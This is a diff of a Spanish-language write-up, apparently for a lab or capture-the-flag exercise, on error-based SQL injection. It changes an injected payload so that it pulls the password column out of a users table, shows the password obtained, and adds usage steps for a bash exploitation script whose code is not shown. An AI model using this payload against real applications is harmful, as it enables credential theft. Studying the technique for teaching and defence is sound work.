@@ -46,8 +46,27 @@ La aplicacion mostro directamente los mensajes de error retornados por el gestor
 
 ![errores](screenshots/filtracionerrores.png)
 
-Pala la obtencion de la contraseña se inyecto `'+OR+1=(SELECT CAST(username AS INT) FROM users LIMIT 1)--`
+Pala la obtencion de la contraseña se inyecto `'+OR+1=(SELECT CAST(password AS INT) FROM users LIMIT 1)--`
 
 ![password](screenshots/password.png)
 
 Contraseña obtenida: qu9tfd6oobn4m4rw5j8i
+
+
+
+## Scripts de explotacion
+
+### Script Bash
+
+Otorgar permisos de ejecucion:
+```bash
+chmod u+x script.sh
+```
+Uso:
+```bash
+./script.sh <url>
+```
+
+Ejemplo:
+
+![ScriptBash](screenshots/scriptuso.png)
